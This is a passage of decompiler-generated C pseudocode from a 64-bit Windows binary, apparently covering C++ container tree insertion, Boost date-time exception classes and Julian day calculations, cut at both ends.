  if ( (_BYTE)a3 )
  {
    if ( v9 == **(__int64 ***)a1 )
    {
      LOBYTE(a3) = 1;
      *(_QWORD *)v7 = *sub_140077970(a1, &v15, a3, v9, (__int64)v5, a5);
      *(_BYTE *)(v7 + 8) = 1;
      return v7;
    }
    if ( *((_BYTE *)v9 + 25) )
    {
      v11 = (__int64 *)v9[2];
    }
    else if ( *(_BYTE *)(*v9 + 25) )
    {
      for ( i = (__int64 *)v9[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
      {
        if ( v11 != (__int64 *)*i )
          break;
        v11 = i;
      }
      if ( !*((_BYTE *)v11 + 25) )
        v11 = i;
    }
    else
    {
      v11 = (__int64 *)*v9;
      for ( j = *(__int64 **)(*v9 + 16); !*((_BYTE *)j + 25); j = (__int64 *)j[2] )
        v11 = j;
    }
  }
  if ( *((_DWORD *)v11 + 8) >= *v5 )
  {
    operator delete(a5);
    *(_QWORD *)v7 = v11;
    *(_BYTE *)(v7 + 8) = 0;
  }
  else
  {
    *(_QWORD *)v7 = *sub_140077970(a1, &v15, a3, v9, (__int64)v5, a5);
    *(_BYTE *)(v7 + 8) = 1;
  }
  return v7;
}

//----- (00000001400169D0) ----------------------------------------------------
__int64 __fastcall sub_1400169D0(_QWORD *a1, __int64 a2, char a3, unsigned __int64 *a4)
{
  unsigned __int64 *v4; // rdi
  char v5; // r10
  __int64 v6; // rbx
  _QWORD *v7; // rsi
  __int64 *v8; // rax
  __int64 *v9; // r9
  bool v10; // r8
  unsigned __int64 v11; // rdx
  __int64 *v12; // rax
  __int64 *j; // rcx
  __int64 *i; // rcx
  char v16; // [rsp+50h] [rbp+8h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = *(__int64 **)(*a1 + 8i64);
  v9 = (__int64 *)*a1;
  v10 = 1;
  if ( !*((_BYTE *)v8 + 25) )
  {
    v11 = *v4;
    do
    {
      v9 = v8;
      if ( v5 )
        v10 = v8[4] >= v11;
      else
        v10 = v11 < v8[4];
      if ( v10 )
        v8 = (__int64 *)*v8;
      else
        v8 = (__int64 *)v8[2];
    }
    while ( !*((_BYTE *)v8 + 25) );
  }
  v12 = v9;
  if ( v10 )
  {
    if ( v9 == *(__int64 **)*a1 )
    {
      *(_QWORD *)v6 = *sub_140016340(a1, &v16, 1, v9, v4);
      *(_BYTE *)(v6 + 8) = 1;
      return v6;
    }
    if ( *((_BYTE *)v9 + 25) )
    {
      v12 = (__int64 *)v9[2];
    }
    else if ( *(_BYTE *)(*v9 + 25) )
    {
      for ( i = (__int64 *)v9[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
      {
        if ( v12 != (__int64 *)*i )
          break;
        v12 = i;
      }
      if ( !*((_BYTE *)v12 + 25) )
        v12 = i;
    }
    else
    {
      v12 = (__int64 *)*v9;
      for ( j = *(__int64 **)(*v9 + 16); !*((_BYTE *)j + 25); j = (__int64 *)j[2] )
        v12 = j;
    }
  }
  if ( v12[4] >= *v4 )
  {
    *(_QWORD *)v6 = v12;
    *(_BYTE *)(v6 + 8) = 0;
  }
  else
  {
    *(_QWORD *)v6 = *sub_140016340(v7, &v16, v10, v9, v4);
    *(_BYTE *)(v6 + 8) = 1;
  }
  return v6;
}

//----- (0000000140016B30) ----------------------------------------------------
_QWORD *__fastcall sub_140016B30(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  for ( ; a1 != a2; a1 += 2 )
  {
    if ( a3 )
    {
      *a3 = *a1;
      a3[1] = a1[1];
    }
    a3 += 2;
  }
  return a3;
}

//----- (0000000140016B70) ----------------------------------------------------
_QWORD *__fastcall sub_140016B70(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  for ( ; a1 != a2; ++a1 )
  {
    if ( a3 )
    {
      *a3 = *a1;
      *a1 = 0i64;
    }
    ++a3;
  }
  return a3;
}

//----- (0000000140016BC0) ----------------------------------------------------
_QWORD *__fastcall sub_140016BC0(_QWORD *a1, const struct std::exception *a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  sub_140017480(a1, a2, 1);
  return v2;
}

//----- (0000000140016BF0) ----------------------------------------------------
_QWORD *__fastcall sub_140016BF0(_QWORD *a1, const struct std::exception *a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  sub_140017690(a1, a2, 1);
  return v2;
}

//----- (0000000140016C20) ----------------------------------------------------
_QWORD *__fastcall sub_140016C20(_QWORD *a1, const struct std::exception *a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  sub_1400178A0(a1, a2, 1);
  return v2;
}

//----- (0000000140016C50) ----------------------------------------------------
_QWORD *__fastcall sub_140016C50(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  sub_140017AB0(a1, a2, 1);
  return v2;
}

//----- (0000000140016C80) ----------------------------------------------------
_QWORD *__fastcall sub_140016C80(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  sub_140017CC0(a1, a2, 1);
  return v2;
}

//----- (0000000140016CB0) ----------------------------------------------------
std::exception *__fastcall sub_140016CB0(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  std::exception::exception(a1, a2);
  *((_QWORD *)v2 + 4) = 0i64;
  *((_QWORD *)v2 + 5) = 0i64;
  *((_QWORD *)v2 + 6) = 0i64;
  *((_DWORD *)v2 + 14) = -1;
  *(_QWORD *)v2 = &off_1400A4F40;
  *((_QWORD *)v2 + 3) = &off_1400A4F50;
  return v2;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A4F50: using guessed type __int64 (__fastcall *off_1400A4F50)();

//----- (0000000140016D00) ----------------------------------------------------
std::exception *__fastcall sub_140016D00(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  std::exception::exception(a1, a2);
  *((_QWORD *)v2 + 4) = 0i64;
  *((_QWORD *)v2 + 5) = 0i64;
  *((_QWORD *)v2 + 6) = 0i64;
  *((_DWORD *)v2 + 14) = -1;
  *(_QWORD *)v2 = &off_1400A4F90;
  *((_QWORD *)v2 + 3) = &off_1400A4FA0;
  return v2;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A4F90: using guessed type __int64 (__fastcall *off_1400A4F90)(void *);
// 1400A4FA0: using guessed type __int64 (__fastcall *off_1400A4FA0)();

//----- (0000000140016D50) ----------------------------------------------------
std::exception *__fastcall sub_140016D50(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  sub_140011370(a1, a2);
  *((_QWORD *)v2 + 10) = 0i64;
  *((_QWORD *)v2 + 11) = 0i64;
  *((_QWORD *)v2 + 12) = 0i64;
  *((_DWORD *)v2 + 26) = -1;
  *(_QWORD *)v2 = &off_1400A3D18;
  *((_QWORD *)v2 + 9) = &off_1400A4FE0;
  return v2;
}
// 1400A3D18: using guessed type __int64 (__fastcall *off_1400A3D18)(void *);
// 1400A4FE0: using guessed type __int64 (__fastcall *off_1400A4FE0)();

//----- (0000000140016DA0) ----------------------------------------------------
char *__fastcall sub_140016DA0(_OWORD *a1)
{
  _OWORD *v1; // rdi
  HANDLE v2; // rax
  const char *v3; // rax
  char *v4; // rbx
  void *v6; // [rsp+28h] [rbp-20h]
  const char *v7; // [rsp+58h] [rbp+10h]
  const char *v8; // [rsp+60h] [rbp+18h]
  const char *v9; // [rsp+68h] [rbp+20h]

  v1 = a1;
  v2 = GetProcessHeap();
  v3 = (const char *)HeapAlloc(v2, 0, 0x88ui64);
  v4 = (char *)v3;
  v7 = v3;
  if ( !v3 )
  {
    v7 = "bad allocation";
    std::exception::exception((std::exception *)&v6, &v7, 1);
    v6 = &loc_1400A3C88;
    sub_140017340(&v6);
  }
  v8 = v3;
  v9 = v3;
  sub_1400186C0((__int64)v3);
  *(_QWORD *)v4 = &off_1400A5108;
  *(_OWORD *)(v4 + 120) = *v1;
  return v4;
}
// 140017340: using guessed type __int64 __fastcall sub_140017340(_QWORD);
// 1400A1990: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD);
// 1400A5108: using guessed type __int64 (__fastcall *off_1400A5108)(void *);

//----- (0000000140016E50) ----------------------------------------------------
char **__fastcall sub_140016E50(char **a1, _OWORD *a2)
{
  char **v2; // rbx
  char *v3; // rax

  v2 = a1;
  v3 = sub_140016DA0(a2);
  *v2 = v3;
  if ( v3 )
    _InterlockedIncrement((volatile signed __int32 *)v3 + 2);
  return v2;
}

//----- (0000000140017280) ----------------------------------------------------
void __fastcall __noreturn sub_140017280(const struct std::exception *a1)
{
  std::exception *v1; // rax
  char v2; // [rsp+28h] [rbp-A0h]
  char v3; // [rsp+80h] [rbp-48h]

  v1 = sub_140016CB0((std::exception *)&v3, a1);
  sub_140016BC0(&v2, v1);
  CxxThrowException(
    &v2,
    &_TI8_AV__clone_impl_U__error_info_injector_Ubad_day_of_month_gregorian_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D35B8: using guessed type int _TI8_AV__clone_impl_U__error_info_injector_Ubad_day_of_month_gregorian_boost___exception_detail_boost___exception_detail_boost__;

//----- (00000001400172C0) ----------------------------------------------------
void __fastcall __noreturn sub_1400172C0(const struct std::exception *a1)
{
  std::exception *v1; // rax
  char v2; // [rsp+28h] [rbp-A0h]
  char v3; // [rsp+80h] [rbp-48h]

  v1 = sub_140016CB0((std::exception *)&v3, a1);
  sub_140016BF0(&v2, v1);
  CxxThrowException(
    &v2,
    &_TI8_AV__clone_impl_U__error_info_injector_Ubad_month_gregorian_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3990: using guessed type int _TI8_AV__clone_impl_U__error_info_injector_Ubad_month_gregorian_boost___exception_detail_boost___exception_detail_boost__;

//----- (0000000140017300) ----------------------------------------------------
void __fastcall __noreturn sub_140017300(const struct std::exception *a1)
{
  std::exception *v1; // rax
  char v2; // [rsp+28h] [rbp-A0h]
  char v3; // [rsp+80h] [rbp-48h]

  v1 = sub_140016CB0((std::exception *)&v3, a1);
  sub_140016C20(&v2, v1);
  CxxThrowException(
    &v2,
    &_TI8_AV__clone_impl_U__error_info_injector_Ubad_year_gregorian_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D38A8: using guessed type int _TI8_AV__clone_impl_U__error_info_injector_Ubad_year_gregorian_boost___exception_detail_boost___exception_detail_boost__;

//----- (00000001400173C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400173C0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4)
{
  const struct std::exception *v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rcx

  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  if ( a4 )
  {
    a1[8] = &unk_1400A4F88;
    a1[10] = &off_1400A3CB8;
  }
  sub_140017FB0((std::exception *)a1, a2);
  *v5 = &off_1400A4F58;
  v5[3] = off_1400A4F68;
  *(_QWORD *)((char *)v5 + *(signed int *)(v5[8] + 4i64) + 64) = &off_1400A4F70;
  v7 = *(signed int *)(v5[8] + 4i64);
  *(_DWORD *)((char *)v5 + v7 + 60) = v7 - 16;
  if ( v4 )
    v6 = (__int64)v4 + 24;
  sub_140013340((__int64)(v5 + 3), v6);
  return v5;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4F58: using guessed type __int64 (__fastcall *off_1400A4F58)(void *);
// 1400A4F68: using guessed type __int64 (__fastcall *off_1400A4F68[2])();
// 1400A4F70: using guessed type __int64 (__fastcall *off_1400A4F70)();

//----- (0000000140017480) ----------------------------------------------------
_QWORD *__fastcall sub_140017480(_QWORD *a1, const struct std::exception *a2, int a3)
{
  const struct std::exception *v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rcx

  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  if ( a3 )
  {
    a1[8] = &unk_1400A4F88;
    a1[10] = &off_1400A3CB8;
  }
  sub_140017FB0((std::exception *)a1, a2);
  *v4 = &off_1400A4F58;
  v4[3] = off_1400A4F68;
  *(_QWORD *)((char *)v4 + *(signed int *)(v4[8] + 4i64) + 64) = &off_1400A4F70;
  v6 = *(signed int *)(v4[8] + 4i64);
  *(_DWORD *)((char *)v4 + v6 + 60) = v6 - 16;
  if ( v3 )
    v5 = (__int64)v3 + 24;
  sub_140013340((__int64)(v4 + 3), v5);
  return v4;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4F58: using guessed type __int64 (__fastcall *off_1400A4F58)(void *);
// 1400A4F68: using guessed type __int64 (__fastcall *off_1400A4F68[2])();
// 1400A4F70: using guessed type __int64 (__fastcall *off_1400A4F70)();

//----- (0000000140017540) ----------------------------------------------------
_QWORD *__fastcall sub_140017540(_QWORD *a1, const struct std::exception *a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[8] = &unk_1400A4F88;
    a1[10] = &off_1400A3CB8;
  }
  sub_140017FB0((std::exception *)a1, a2);
  *v3 = &off_1400A4F58;
  v3[3] = off_1400A4F68;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A4F70;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 60) = 0;
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4F58: using guessed type __int64 (__fastcall *off_1400A4F58)(void *);
// 1400A4F68: using guessed type __int64 (__fastcall *off_1400A4F68[2])();
// 1400A4F70: using guessed type __int64 (__fastcall *off_1400A4F70)();

//----- (00000001400175D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400175D0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4)
{
  const struct std::exception *v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rcx

  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  if ( a4 )
  {
    a1[8] = &unk_1400A5088;
    a1[10] = &off_1400A3CB8;
  }
  sub_140018040((std::exception *)a1, a2);
  *v5 = &off_1400A5058;
  v5[3] = off_1400A5068;
  *(_QWORD *)((char *)v5 + *(signed int *)(v5[8] + 4i64) + 64) = &off_1400A5070;
  v7 = *(signed int *)(v5[8] + 4i64);
  *(_DWORD *)((char *)v5 + v7 + 60) = v7 - 16;
  if ( v4 )
    v6 = (__int64)v4 + 24;
  sub_140013340((__int64)(v5 + 3), v6);
  return v5;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A5058: using guessed type __int64 (__fastcall *off_1400A5058)(void *);
// 1400A5068: using guessed type __int64 (__fastcall *off_1400A5068[2])();
// 1400A5070: using guessed type __int64 (__fastcall *off_1400A5070)();

//----- (0000000140017690) ----------------------------------------------------
_QWORD *__fastcall sub_140017690(_QWORD *a1, const struct std::exception *a2, int a3)
{
  const struct std::exception *v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rcx

  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  if ( a3 )
  {
    a1[8] = &unk_1400A5088;
    a1[10] = &off_1400A3CB8;
  }
  sub_140018040((std::exception *)a1, a2);
  *v4 = &off_1400A5058;
  v4[3] = off_1400A5068;
  *(_QWORD *)((char *)v4 + *(signed int *)(v4[8] + 4i64) + 64) = &off_1400A5070;
  v6 = *(signed int *)(v4[8] + 4i64);
  *(_DWORD *)((char *)v4 + v6 + 60) = v6 - 16;
  if ( v3 )
    v5 = (__int64)v3 + 24;
  sub_140013340((__int64)(v4 + 3), v5);
  return v4;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A5058: using guessed type __int64 (__fastcall *off_1400A5058)(void *);
// 1400A5068: using guessed type __int64 (__fastcall *off_1400A5068[2])();
// 1400A5070: using guessed type __int64 (__fastcall *off_1400A5070)();

//----- (0000000140017750) ----------------------------------------------------
_QWORD *__fastcall sub_140017750(_QWORD *a1, const struct std::exception *a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[8] = &unk_1400A5088;
    a1[10] = &off_1400A3CB8;
  }
  sub_140018040((std::exception *)a1, a2);
  *v3 = &off_1400A5058;
  v3[3] = off_1400A5068;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A5070;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 60) = 0;
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A5058: using guessed type __int64 (__fastcall *off_1400A5058)(void *);
// 1400A5068: using guessed type __int64 (__fastcall *off_1400A5068[2])();
// 1400A5070: using guessed type __int64 (__fastcall *off_1400A5070)();

//----- (00000001400177E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400177E0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4)
{
  const struct std::exception *v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rcx

  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  if ( a4 )
  {
    a1[8] = &unk_1400A5050;
    a1[10] = &off_1400A3CB8;
  }
  sub_1400180D0((std::exception *)a1, a2);
  *v5 = &off_1400A5020;
  v5[3] = off_1400A5030;
  *(_QWORD *)((char *)v5 + *(signed int *)(v5[8] + 4i64) + 64) = &off_1400A5038;
  v7 = *(signed int *)(v5[8] + 4i64);
  *(_DWORD *)((char *)v5 + v7 + 60) = v7 - 16;
  if ( v4 )
    v6 = (__int64)v4 + 24;
  sub_140013340((__int64)(v5 + 3), v6);
  return v5;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A5020: using guessed type __int64 (__fastcall *off_1400A5020)(void *);
// 1400A5030: using guessed type __int64 (__fastcall *off_1400A5030[2])();
// 1400A5038: using guessed type __int64 (__fastcall *off_1400A5038)();

//----- (00000001400178A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400178A0(_QWORD *a1, const struct std::exception *a2, int a3)
{
  const struct std::exception *v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rcx

  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  if ( a3 )
  {
    a1[8] = &unk_1400A5050;
    a1[10] = &off_1400A3CB8;
  }
  sub_1400180D0((std::exception *)a1, a2);
  *v4 = &off_1400A5020;
  v4[3] = off_1400A5030;
  *(_QWORD *)((char *)v4 + *(signed int *)(v4[8] + 4i64) + 64) = &off_1400A5038;
  v6 = *(signed int *)(v4[8] + 4i64);
  *(_DWORD *)((char *)v4 + v6 + 60) = v6 - 16;
  if ( v3 )
    v5 = (__int64)v3 + 24;
  sub_140013340((__int64)(v4 + 3), v5);
  return v4;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A5020: using guessed type __int64 (__fastcall *off_1400A5020)(void *);
// 1400A5030: using guessed type __int64 (__fastcall *off_1400A5030[2])();
// 1400A5038: using guessed type __int64 (__fastcall *off_1400A5038)();

//----- (0000000140017960) ----------------------------------------------------
_QWORD *__fastcall sub_140017960(_QWORD *a1, const struct std::exception *a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[8] = &unk_1400A5050;
    a1[10] = &off_1400A3CB8;
  }
  sub_1400180D0((std::exception *)a1, a2);
  *v3 = &off_1400A5020;
  v3[3] = off_1400A5030;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A5038;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 60) = 0;
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A5020: using guessed type __int64 (__fastcall *off_1400A5020)(void *);
// 1400A5030: using guessed type __int64 (__fastcall *off_1400A5030[2])();
// 1400A5038: using guessed type __int64 (__fastcall *off_1400A5038)();

//----- (00000001400179F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400179F0(_QWORD *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rcx

  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  if ( a4 )
  {
    a1[8] = &unk_1400A4FD8;
    a1[10] = &off_1400A3CB8;
  }
  sub_140018160(a1);
  *v5 = &off_1400A4FA8;
  v5[3] = off_1400A4FB8;
  *(_QWORD *)((char *)v5 + *(signed int *)(v5[8] + 4i64) + 64) = &off_1400A4FC0;
  v7 = *(signed int *)(v5[8] + 4i64);
  *(_DWORD *)((char *)v5 + v7 + 60) = v7 - 16;
  if ( v4 )
    v6 = v4 + 24;
  sub_140013340((__int64)(v5 + 3), v6);
  return v5;
}
// 140018160: using guessed type __int64 __cdecl sub_140018160(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FA8: using guessed type __int64 (__fastcall *off_1400A4FA8)(void *);
// 1400A4FB8: using guessed type __int64 (__fastcall *off_1400A4FB8[2])();
// 1400A4FC0: using guessed type __int64 (__fastcall *off_1400A4FC0)();

//----- (0000000140017AB0) ----------------------------------------------------
_QWORD *__fastcall sub_140017AB0(_QWORD *a1, __int64 a2, int a3)
{
  __int64 v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rcx

  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  if ( a3 )
  {
    a1[8] = &unk_1400A4FD8;
    a1[10] = &off_1400A3CB8;
  }
  sub_140018160(a1);
  *v4 = &off_1400A4FA8;
  v4[3] = off_1400A4FB8;
  *(_QWORD *)((char *)v4 + *(signed int *)(v4[8] + 4i64) + 64) = &off_1400A4FC0;
  v6 = *(signed int *)(v4[8] + 4i64);
  *(_DWORD *)((char *)v4 + v6 + 60) = v6 - 16;
  if ( v3 )
    v5 = v3 + 24;
  sub_140013340((__int64)(v4 + 3), v5);
  return v4;
}
// 140018160: using guessed type __int64 __cdecl sub_140018160(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FA8: using guessed type __int64 (__fastcall *off_1400A4FA8)(void *);
// 1400A4FB8: using guessed type __int64 (__fastcall *off_1400A4FB8[2])();
// 1400A4FC0: using guessed type __int64 (__fastcall *off_1400A4FC0)();

//----- (0000000140017B70) ----------------------------------------------------
_QWORD *__fastcall sub_140017B70(_QWORD *a1, __int64 a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[8] = &unk_1400A4FD8;
    a1[10] = &off_1400A3CB8;
  }
  sub_140018160(a1);
  *v3 = &off_1400A4FA8;
  v3[3] = off_1400A4FB8;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A4FC0;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 60) = 0;
  return v3;
}
// 140018160: using guessed type __int64 __cdecl sub_140018160(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FA8: using guessed type __int64 (__fastcall *off_1400A4FA8)(void *);
// 1400A4FB8: using guessed type __int64 (__fastcall *off_1400A4FB8[2])();
// 1400A4FC0: using guessed type __int64 (__fastcall *off_1400A4FC0)();

//----- (0000000140017C00) ----------------------------------------------------
_QWORD *__fastcall sub_140017C00(_QWORD *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rcx

  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  if ( a4 )
  {
    a1[14] = &unk_1400A5018;
    a1[16] = &off_1400A3CB8;
  }
  sub_1400181F0(a1);
  *v5 = &off_1400A4FE8;
  v5[9] = off_1400A4FF8;
  *(_QWORD *)((char *)v5 + *(signed int *)(v5[14] + 4i64) + 112) = &off_1400A5000;
  v7 = *(signed int *)(v5[14] + 4i64);
  *(_DWORD *)((char *)v5 + v7 + 108) = v7 - 16;
  if ( v4 )
    v6 = v4 + 72;
  sub_140013340((__int64)(v5 + 9), v6);
  return v5;
}
// 1400181F0: using guessed type __int64 __cdecl sub_1400181F0(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FE8: using guessed type __int64 (__fastcall *off_1400A4FE8)(void *);
// 1400A4FF8: using guessed type __int64 (__fastcall *off_1400A4FF8[2])();
// 1400A5000: using guessed type __int64 (__fastcall *off_1400A5000)();

//----- (0000000140017CC0) ----------------------------------------------------
_QWORD *__fastcall sub_140017CC0(_QWORD *a1, __int64 a2, int a3)
{
  __int64 v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rcx

  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  if ( a3 )
  {
    a1[14] = &unk_1400A5018;
    a1[16] = &off_1400A3CB8;
  }
  sub_1400181F0(a1);
  *v4 = &off_1400A4FE8;
  v4[9] = off_1400A4FF8;
  *(_QWORD *)((char *)v4 + *(signed int *)(v4[14] + 4i64) + 112) = &off_1400A5000;
  v6 = *(signed int *)(v4[14] + 4i64);
  *(_DWORD *)((char *)v4 + v6 + 108) = v6 - 16;
  if ( v3 )
    v5 = v3 + 72;
  sub_140013340((__int64)(v4 + 9), v5);
  return v4;
}
// 1400181F0: using guessed type __int64 __cdecl sub_1400181F0(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FE8: using guessed type __int64 (__fastcall *off_1400A4FE8)(void *);
// 1400A4FF8: using guessed type __int64 (__fastcall *off_1400A4FF8[2])();
// 1400A5000: using guessed type __int64 (__fastcall *off_1400A5000)();

//----- (0000000140017D80) ----------------------------------------------------
_QWORD *__fastcall sub_140017D80(_QWORD *a1, __int64 a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[14] = &unk_1400A5018;
    a1[16] = &off_1400A3CB8;
  }
  sub_1400181F0(a1);
  *v3 = &off_1400A4FE8;
  v3[9] = off_1400A4FF8;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[14] + 4i64) + 112) = &off_1400A5000;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[14] + 4i64) + 108) = 0;
  return v3;
}
// 1400181F0: using guessed type __int64 __cdecl sub_1400181F0(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FE8: using guessed type __int64 (__fastcall *off_1400A4FE8)(void *);
// 1400A4FF8: using guessed type __int64 (__fastcall *off_1400A4FF8[2])();
// 1400A5000: using guessed type __int64 (__fastcall *off_1400A5000)();

//----- (0000000140017E10) ----------------------------------------------------
signed __int64 *__fastcall sub_140017E10(signed __int64 *a1, unsigned int *a2, signed __int64 *a3)
{
  __int64 v3; // rdx
  signed __int64 *v4; // r9
  signed __int64 v6; // rcx
  signed __int64 v7; // rax
  bool v8; // zf

  *a1 = 1i64;
  v3 = *a2;
  v4 = a1;
  if ( (unsigned int)(v3 - 1) <= 0xFFFFFFFD
    && (_DWORD)v3 != -2
    && (unsigned __int64)(*a3 + 0x7FFFFFFFFFFFFFFFi64) <= 0xFFFFFFFFFFFFFFFCui64 )
  {
    *a1 = *a3 + 86400000000i64 * (unsigned int)v3;
    return a1;
  }
  v6 = *a3;
  v7 = 9223372036854775806i64;
  if ( (unsigned __int64)(*a3 + 0x7FFFFFFFFFFFFFFFi64) <= 0xFFFFFFFFFFFFFFFDui64 )
  {
    if ( v6 == 9223372036854775806i64 )
      goto LABEL_20;
    if ( (unsigned int)(v3 - 1) <= 0xFFFFFFFC )
    {
LABEL_19:
      v7 = v6 + v3;
      goto LABEL_20;
    }
  }
  if ( v6 != 9223372036854775806i64 && (_DWORD)v3 != -2 )
  {
    if ( v6 == 0x7FFFFFFFFFFFFFFFi64 )
    {
      v8 = (_DWORD)v3 == 0;
      goto LABEL_14;
    }
    if ( v6 == 0x8000000000000000i64 )
    {
      v8 = (_DWORD)v3 == -1;
LABEL_14:
      if ( !v8 )
      {
        *v4 = v6;
        return v4;
      }
      goto LABEL_20;
    }
    if ( (_DWORD)v3 == -1 )
    {
      *v4 = 0x7FFFFFFFFFFFFFFFi64;
      return v4;
    }
    v7 = 0x8000000000000000i64;
    if ( (_DWORD)v3 )
      goto LABEL_19;
  }
LABEL_20:
  *v4 = v7;
  return v4;
}

//----- (0000000140017EE0) ----------------------------------------------------
_DWORD *__fastcall sub_140017EE0(_DWORD *a1, __int16 a2, unsigned __int16 a3, unsigned __int16 a4)
{
  int v4; // eax
  _DWORD *v5; // rbx
  unsigned __int16 v6; // r10
  int v7; // ecx
  _DWORD *result; // rax

  v4 = a3;
  v5 = a1;
  v6 = a2
     - (((unsigned int)((unsigned __int64)(715827883i64 * (14 - v4)) >> 32) >> 31)
      + ((signed int)((unsigned __int64)(715827883i64 * (14 - v4)) >> 32) >> 1))
     + 4800;
  v7 = (153
      * (unsigned __int16)(a3
                         - 3
                         + 12
                         * (((unsigned int)((unsigned __int64)(715827883i64 * (14 - v4)) >> 32) >> 31)
                          + ((signed int)((unsigned __int64)(715827883i64 * (14 - v4)) >> 32) >> 1)))
      + 2)
     / 5;
  result = v5;
  *v5 = ((unsigned int)v6 >> 2) + 365 * v6 + v6 / 400 + v7 - v6 / 100 + a4 - 32045;
  return result;
}

//----- (0000000140017FB0) ----------------------------------------------------
std::exception *__fastcall sub_140017FB0(std::exception *a1, const struct std::exception *a2)
{
